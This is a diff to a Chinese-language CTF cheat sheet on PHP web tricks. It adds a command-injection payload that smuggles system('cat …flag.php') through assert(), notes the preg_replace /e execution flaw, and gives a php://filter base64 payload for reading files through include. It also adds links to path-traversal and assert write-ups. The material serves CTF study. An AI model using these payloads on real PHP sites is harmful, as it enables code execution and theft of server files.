@@ -9,6 +9,13 @@ description:
 
 `str_replace / strstr` 函数在匹配 `php://` 字符串时，可以考虑使用大小写或大小写混合的方式绕过检查。
 
+`assert` 绕过可以使用 `*1') or system("cat templates/flag.php");//*`  的方式。
+
+`strpos`  
+
+`preg_replace` 存在 /e 执行漏洞。
+
+
 ## 文件读取
 
 ```php
@@ -28,11 +35,16 @@ data://text/plain,hello ctf
 data://text/plain;base64,aGVsbG8gY3Rm
 ```
 
+### php 伪协议
+
 当遇到 `include` 函数时，可以用 `php://` 伪协议将文件内容打印出来
 
-```php
-$file=php://filter/read=convert.base64-encode/resource=flag.php
+
+```sh
+?file=php://filter/read=convert.base64-encode/resource=flag.php
 ```
+
+
 
 ## 文件上传绕过
 
@@ -80,3 +92,5 @@ $a = str_replace(':1:', ':2:', $a);
 1. [攻防世界CTF —— PHP本地文件包含漏洞解题思路](https://blog.csdn.net/weixin_47610939/article/details/126019042)
 1. [2021-02-23-ctf-Web_php_unserialize反序列化漏洞](https://blog.csdn.net/weixin_43639682/article/details/123686797)
 1. [[CTF]PHP反序列化总结](https://blog.csdn.net/solitudi/article/details/113588692)
+1. [XCTF-攻防世界CTF平台-Web类——19、mfw（.Git源代码泄露、php的assert断言）](https://blog.csdn.net/Onlyone_1314/article/details/121876664)
+1. [路径穿越（Path Traversal）详解](https://blog.csdn.net/qingzhantianxia/article/details/128204437)
